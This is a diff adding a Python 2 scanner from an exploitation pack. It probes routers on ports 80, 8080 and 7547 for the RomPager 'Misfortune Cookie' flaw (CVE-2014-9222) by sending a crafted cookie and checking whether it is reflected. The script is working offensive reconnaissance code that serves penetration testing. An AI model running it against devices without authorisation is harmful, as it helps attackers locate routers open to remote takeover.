@@ -1,0 +1,74 @@
+#!/usr/bin/python2 
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2015
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import httplib2
+import socket
+
+# Inspired from j91231's REXT
+_name_   = 'd2sec_misfortune_cookie_scanner.py'
+_vendor_ = 'All'
+_model_  = ['All']
+_vuln_   = 'Arbitrary Remote Code Execution'
+_cve_    = 'CVE-2014-9222'
+_ref_    = ''
+_port_   = 80
+
+def _pwnrouter(host, port):
+  user_agent = 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)'
+  headers = {'User-Agent': user_agent,
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-language': 'sk,cs;q=0.8,en-US;q=0.5,en;q,0.3',
+    'Connection': 'keep-alive',
+    'Accept-Encoding': 'gzip, deflate',
+    'Cache-Control': 'no-cache',
+    'Cookie': 'C107373883=/omg1337hax'}
+  target = 'http://' + host + ":" + port + '/blabla'
+  h = httplib2.Http(timeout=3)
+  h.follow_all_redirects = True
+  try:
+    response, content = h.request(target, 'GET', headers=headers)
+    if response.status != 404:
+      print '  [-] unexpected HTTP status, expecting 404 got: %d' % response.status
+      print '  [-] device is not running RomPager'
+    else:
+      if 'server' in response.keys():
+        server = response.get('server')
+        if re.search('RomPager', server) is not None:
+          print '  [+] Got RomPager! Server:%s' % server
+          if re.search('omg1337hax', content.decode()) is not None:
+            print '  [#] device is vulnerable to misfortune cookie'
+            return 1
+          else:
+            print '  [-] test didn\'t pass.'
+            print '  [-] device MAY still be vulnerable'
+        else:
+            print '  [-] RomPager not detected, device is running: %s' % server
+      else:
+        print '  [-] not running RomPager'
+  except socket.timeout: 
+    print '  [-] Timeout!'
+  except Exception, e:
+    print '  [-] Unknown error!'
+    return 0
+
+def pwnrouter(host):
+  ports = ['80', '8080', '7547']
+  for port in ports:
+    print '[#] Host: %s:%s' % (host, port)
+    i = _pwnrouter(host, port)
+    if i == 1:
+      break
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
